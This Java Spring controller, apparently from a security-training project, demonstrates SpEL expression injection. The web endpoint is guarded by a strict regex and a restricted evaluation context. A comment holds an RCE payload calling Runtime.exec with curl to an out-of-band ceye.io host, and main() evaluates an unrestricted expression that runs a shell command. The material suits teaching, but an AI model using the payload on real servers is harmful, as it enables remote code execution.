package org.joychou.controller;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final Pattern SAFE_EXPRESSION = Pattern.compile("^[0-9+\\-*/%().<>=!\\s]{1,128}$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // Only literals/arithmetic/comparison text is accepted: no identifiers, so no type, bean,
        // method or property access is possible from request data.
        if (expression == null || !SAFE_EXPRESSION.matcher(expression).matches()) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        // SimpleEvaluationContext: no type references (T(...)), constructors or bean references.
        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        return HtmlUtils.htmlEscape(String.valueOf(parser.parseExpression(expression).getValue(context)));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

